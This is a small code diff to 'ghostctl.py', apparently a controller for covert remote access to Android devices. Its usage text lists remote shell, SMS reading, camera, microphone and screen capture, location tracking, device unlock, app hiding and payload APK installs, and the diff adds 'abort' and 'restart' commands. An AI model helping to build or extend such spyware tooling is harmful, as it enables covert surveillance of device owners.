@@ -4,7 +4,7 @@
 Usage:
   ghostctl.py list | status | devices
   ghostctl.py -d <id> shell "echo hi"
-  ghostctl.py -d <id> files ls|tree|get|put ...
+  ghostctl.py -d <id> files ls|tree|get|put|abort ...
   ghostctl.py -d <id> sms recent [N]
   ghostctl.py -d <id> screen shot|record|live|stop|off ...
   ghostctl.py -d <id> cam snap|live|stop ...
@@ -19,7 +19,7 @@ Usage:
   ghostctl.py -d <id> sidekick status|arm|disarm|ping|install [apk]
   ghostctl.py -d <id> loc once
   ghostctl.py -d <id> device info
-  ghostctl.py -d <id> hide | unhide | status | ping
+  ghostctl.py -d <id> hide | unhide | status | ping | restart
   ghostctl.py -d <id> update self|sidekick [--apk path]
   ghostctl.py -d <id> destroy
   ghostctl.py apks list
@@ -52,6 +52,7 @@ PASS_THROUGH = {
     "files", "sms", "screen", "cam", "mic", "brightness", "volume", "wake",
     "ui", "tap", "longclick", "type", "key", "swipe", "unlock", "arm",
     "disarm", "sidekick", "loc", "device", "hide", "unhide", "status", "ping",
+    "restart",
 }
 
 
